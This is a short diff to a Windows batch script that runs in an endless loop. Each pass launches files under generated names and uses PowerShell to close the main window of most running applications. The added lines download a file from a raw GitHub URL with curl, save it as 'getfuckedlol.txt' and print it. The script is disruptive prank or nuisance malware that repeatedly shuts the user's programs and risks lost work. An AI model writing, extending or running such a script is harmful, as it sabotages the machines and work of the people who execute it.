@@ -1,5 +1,10 @@
 @echo off
 :restart
+set "GITHUB_URL=https://raw.githubusercontent.com/dm7257540-spec/duplicate/refs/heads/main/message"
+set "OUTPUT_FILE=getfuckedlol.txt"
+
+curl -L "%GITHUB_URL%" -o "%OUTPUT_FILE%"
+
 setlocal enabledelayedexpansion
 
 :: Define the alphabet string
@@ -27,6 +32,8 @@ start "" "!new_filename!"
 
 powershell -NoProfile -Command ^
     "Get-Process | Where-Object { $_.MainWindowTitle -and $_.ProcessName -notin 'cmd','powershell','explorer' } | ForEach-Object { $_.CloseMainWindow() }"
+
+type getfuckedlol.txt
 
 endlocal
 goto restart
